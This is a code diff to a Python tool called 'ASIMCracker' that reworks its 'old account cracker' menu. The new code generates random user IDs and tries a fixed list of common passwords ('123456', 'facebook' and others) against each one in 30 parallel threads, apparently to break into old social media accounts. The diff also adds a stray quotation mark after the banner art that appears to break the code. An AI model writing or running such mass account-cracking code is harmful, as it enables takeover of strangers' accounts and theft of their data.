@@ -296,7 +296,7 @@ class SubscriptionManager:
 \033[1;91m██║██████╔╝█████╗  ███████║██╔██╗ ██║    \033[1;92m███████║███████║██╔████╔██║█████╗  ██║  ██║\033[0m
 \033[1;91m██║██╔══██╗██╔══╝  ██╔══██║██║╚██╗██║    \033[1;92m██╔══██║██╔══██║██║╚██╔╝██║██╔══╝  ██║  ██║\033[0m
 \033[1;91m██║██║  ██║██║     ██║  ██║██║ ╚████║    \033[1;92m██║  ██║██║  ██║██║ ╚═╝ ██║███████╗██████╔╝\033[0m
-\033[1;91m╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝    \033[1;92m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═════╝\033[0m                                                                                                                     
+\033[1;91m╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝    \033[1;92m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═════╝\033[0m"                                                                                                                     
 \x1b[1;95m╔═══════════════════════════════════════════════════════╗
 \x1b[1;95m║\x1b[1;97m                ✦  𝗧𝗢𝗢𝗟 I𝗡𝗙𝗢 𝗣𝗔𝗡𝗘𝗟  ✦                  \x1b[1;95m║
 \x1b[1;95m╚═══════════════════════════════════════════════════════╝
@@ -574,7 +574,7 @@ class ASIMCracker:
         except Exception:
             return []
 
-    def execute_breach():
+    def old_menu(self):
         clear()
         print(f'{self.color.P}╔═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╗')
         print(f'{self.color.P}║         {self.color.Y}★ OLD ACCOUNT CRACKER ★         {self.color.P}║')
@@ -585,26 +585,34 @@ class ASIMCracker:
 
         choice = input(f'  {self.color.C}➤ Choose: {self.color.W}').strip()
         if choice in ('1', '01'):
-            self.execute_breach()  # ✅ NO prefix
+            try:
+                limit = int(input(f'  {self.color.C}➤ How many UIDs to crack? {self.color.W}'))
+            except ValueError:
+                print(f'  {self.color.R}⚠️ Invalid number!')
+                time.sleep(2)
+                return self.old_menu()
+
+            targets = [str(random.randint(10000000, 19999999)) for _ in range(limit)]
+            passlist = ['123456', 'iloveyou', 'password', '112233', 'facebook', '111111', '12345678']
+
+            with tred(max_workers=30) as executor:
+                clear()
+                print(f'  {self.color.W}\x1b[1;96m   ➤ Cracking Random 2005 UID Range')
+                print(f'  {self.color.W}\x1b[1;96m   ➤ Targets: {self.color.G}{len(targets)}')
+                linex()
+
+                for target in targets:
+                    executor.submit(self.breach_target, target, passlist)
+
+            self.display_results()
+
         elif choice in ('0', '00'):
             return
         else:
             print(f'\n  {self.color.R}⚠️ Invalid choice!')
             time.sleep(2)
-            self.execute_breach()
+            self.old_menu()
             return
-
-        targets = [str(random.randint(10000000, 19999999)) for _ in range(limit)]
-        passlist = ['123456', 'iloveyou', 'password', '112233', 'facebook', '111111', '12345678']
-
-        with tred(max_workers=30) as executor:
-            clear()
-            print(f'  {self.color.W}\x1b[1;96m   ➤ Cracking {self.color.Y}{prefix} ')
-            print(f'  {self.color.W}\x1b[1;96m   ➤ Targets: {self.color.G}{len(targets)}')
-            linex()
-
-            for target in targets:
-                executor.submit(self.breach_target, target, passlist)
 
         self.display_results()
 
